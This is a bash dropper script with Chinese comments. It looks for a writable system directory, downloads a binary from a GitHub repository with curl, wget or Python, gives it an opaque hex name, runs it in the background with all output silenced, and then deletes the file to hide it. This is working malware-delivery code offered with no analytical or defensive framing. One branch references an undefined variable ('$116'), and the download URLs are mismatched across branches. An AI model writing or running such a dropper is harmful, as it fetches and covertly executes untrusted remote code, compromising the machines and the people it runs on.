#!/bin/bash
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
mkdir -p /tmp
cd /tmp
touch /usr/local/bin/writeablex >/dev/null 2>&1 && cd /usr/local/bin/
touch /usr/libexec/writeablex >/dev/null 2>&1 && cd /usr/libexec/
touch /usr/bin/writeablex >/dev/null 2>&1 && cd /usr/bin/
rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex
export PATH=$PATH:$(pwd)

l64="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/tcp8711_a"
l32="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/ws8710"
l16="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/tcp8711"

v="aa4876c2"
rm -rf $v

ARCH="$1"   # 第一个参数作为ARCH
v="aa4876c2"  # 保存的文件名，可按需修改

if [ "${ARCH}" = "ws" ]; then
    (curl -fsSL -m180 "$l64" -o "$v" || wget -T180 -q "$l64" -O "$v" || python -c 'import urllib; urllib.urlretrieve("'"$l32"'", "'"$v"'")')
elif [ "${ARCH}" = "tcp" ]; then
    (curl -fsSL -m180 "$l32" -o "$v" || wget -T180 -q "$l32" -O "$v" || python -c 'import urllib; urllib.urlretrieve("'"$116"'", "'"$v"'")')
elif [ "${ARCH}" = "tcp_a" ]; then
    (curl -fsSL -m180 "$l32" -o "$v" || wget -T180 -q "$l32" -O "$v" || python -c 'import urllib; urllib.urlretrieve("'"$l64"'", "'"$v"'")')
else
    echo "未知架构: $ARCH"
    exit 1
fi

chmod +x $v
(nohup $(pwd)/$v > /dev/null 2>&1 &) || (nohup ./$v > /dev/null 2>&1 &) || (nohup /usr/bin/$v > /dev/null 2>&1 &) || (nohup /usr/libexec/$v > /dev/null 2>&1 &) || (nohup /usr/local/bin/$v > /dev/null 2>&1 &) || (nohup /tmp/$v > /dev/null 2>&1 &)
rm -rf $v
#
